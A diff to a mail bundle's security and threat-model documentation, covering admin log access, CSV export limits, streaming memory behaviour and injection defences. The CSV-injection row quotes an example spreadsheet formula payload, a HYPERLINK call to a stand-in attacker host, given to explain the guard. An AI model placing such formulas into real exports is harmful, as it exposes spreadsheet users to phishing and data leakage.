@@ -34,7 +34,7 @@ transports and provider bridges, or the content of the messages your application
 | --- | --- | --- |
 | DSN, sender, API key fields | Instance Settings section form / import (session, admin) | Validated by the field constraints on save **and** import; secrets encrypted at rest by Instance Settings. |
 | Admin HTTP `GET` (session) | `…/log`, `…/log/{id}`, `…/log/{id}/body` | Access checker on every request under the prefix; UUID route requirement; `no-store`; `sort` / `dir` checked against a whitelist (never interpolated into DQL). |
-| Admin HTTP `GET` (session) | `…/log/export` | Same access as the list plus optional `web_ui.export.access_roles`; formula-injection-safe cells (`CsvSafeWriter`); `no-store`; capped at `web_ui.export.max_rows`; bodies only with `log.store_bodies` + `web_ui.export.include_bodies` + `?bodies=1`. |
+| Admin HTTP `GET` (session) | `…/log/export` | Same access as the list plus optional `web_ui.export.access_roles`; formula-injection guard on every cell (`CsvSafeWriter`, best effort for common spreadsheets); `no-store`; capped at `web_ui.export.max_rows`; bodies only with `log.store_bodies` + `web_ui.export.include_bodies` + `?bodies=1`. |
 | Admin HTTP `POST` (session) | `…/actions/test`, `…/actions/resend/check`, `…/actions/resend/test` | CSRF-only Form, MailKit access **and** Instance Settings section access, per-user rate limit for test e-mails. |
 | Outbound SMTP / provider API | `RuntimeTransport` | Only to validated DSNs (scheme allow-list, host guard); framework `MAILER_DSN` fallback trusted. |
 | Outbound HTTPS | `ResendApiChecker` → `https://api.resend.com/domains` | Fixed URL, deadline, no redirects. |
@@ -57,8 +57,8 @@ transports and provider bridges, or the content of the messages your application
 | **Mail bombing / quota burn through the test action** | Per-user sliding-window rate limit, shared with the Resend key check (each check is an outbound call) (`test_email.rate_limit` per `rate_interval`, client address for anonymous demo access); recipient is the configured test recipient or the user's own address (no free-form recipient in the UI). |
 | **Stored XSS through logged content** | Subjects, addresses, tags and errors are escaped by Twig; the text body is escaped in a `<pre>`; the HTML body is never inlined in the admin page — it is served alone with `Content-Security-Policy: default-src 'none'; img-src data:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `no-store`. |
 | **Injection** | ORM QueryBuilder / DBAL with bound parameters; LIKE patterns escaped (`!` escape); table names come from the configured prefix (validated `[A-Za-z0-9_]*`); the list / export sort is a key whitelist mapped to fixed DQL columns (`SentMailRepository::SORT_FIELDS`, unknown keys refused), never request text in `ORDER BY`. |
-| **CSV / formula injection** (a subject or tag such as `=HYPERLINK("https://attacker.example",…)` run by a spreadsheet when an admin opens the export) | Every exported cell goes through ControllerKit's `CsvSafeWriter`: text starting with `=`, `+`, `-`, `@`, tab or CR gets a leading `'`; RFC 4180 quoting; regression tests with formula payloads in subject and tag. |
-| **Bulk personal-data exfiltration through the export** | Same access as the log plus optional `web_ui.export.access_roles`; `max_rows` cap (10 000); no bodies unless three explicit opt-ins; `no-store`; can be switched off (`web_ui.export.enabled: false`). |
+| **CSV / formula injection** (a subject or tag such as `=HYPERLINK("https://attacker.example",…)` run by a spreadsheet when an admin opens the export) | Every exported cell goes through ControllerKit's `CsvSafeWriter` (≥ 2.3.1): text starting with `=`, `+`, `-`, `@`, tab or CR gets a leading `'`, and a trigger after an embedded `;`, `,`, tab, `|` or line break gets a space (Excel in `;` list-separator locales splits cells there and ignores the quoting); RFC 4180 quoting; regression tests with formula payloads in subject and tag, also read with `;`. This is a best-effort guard for the common spreadsheets (Excel, LibreOffice, Google Sheets), not a guarantee for every CSV consumer: treat the file as untrusted data when another tool processes it. |
+| **Bulk personal-data exfiltration through the export** | Same access as the log plus optional `web_ui.export.access_roles`; `max_rows` cap (10 000, at most 100 000); no bodies unless three explicit opt-ins; `no-store`; can be switched off (`web_ui.export.enabled: false`). |
 | **Log write breaking delivery / host transactions** | Writes go through DBAL (never the host unit of work) and are best effort (warning on failure). |
 | **Accidental route exposure** | The controller is not autoconfigured; routes come only from the `nowo_mail_kit` loader, groups switched off are not loaded (REQ-SF-004 rule 7, integration test). |
 | **Demo configuration in production** | `security.allow_unauthenticated: true` is refused unless `kernel.debug` is true. The demo publishes its ports on `127.0.0.1` only and sends to Mailpit. |
@@ -117,8 +117,12 @@ when not every admin may change the transport.
 - SMTP / provider sends: Symfony transport timeouts (DSN `timeout` option); keep them below PHP `max_execution_time`
   ([CONFIGURATION — Timeouts](CONFIGURATION.md#timeouts-req-runtime-001)).
 - Stored bodies capped at 1 MiB each, errors at 2 000 characters, search at 120 characters, list pages at
-  `web_ui.page_size` (≤ 200); purge in keyset batches; CSV export streamed (one row hydrated at a time, bodies
-  fetched 100 rows per query) and capped at `web_ui.export.max_rows` (10 000).
+  `web_ui.page_size` (≤ 200); purge in keyset batches; CSV export streamed (one row hydrated at a time; bodies loaded
+  in chunks of about `web_ui.export.body_batch_bytes`, 8 MiB, instead of 100 rows of up to 2 MiB each) and capped at
+  `web_ui.export.max_rows` (10 000, at most 100 000). On MySQL / MariaDB `pdo_mysql` buffers the whole row result in
+  the client before the first line is written (a few KiB per row), so the peak memory of an export grows with
+  `max_rows`; the connection is not switched to unbuffered mode because the body queries run while the rows are read.
+  A fatal error in the middle of the stream leaves a partial file with status 200 (headers already sent).
 
 ## CSRF
 
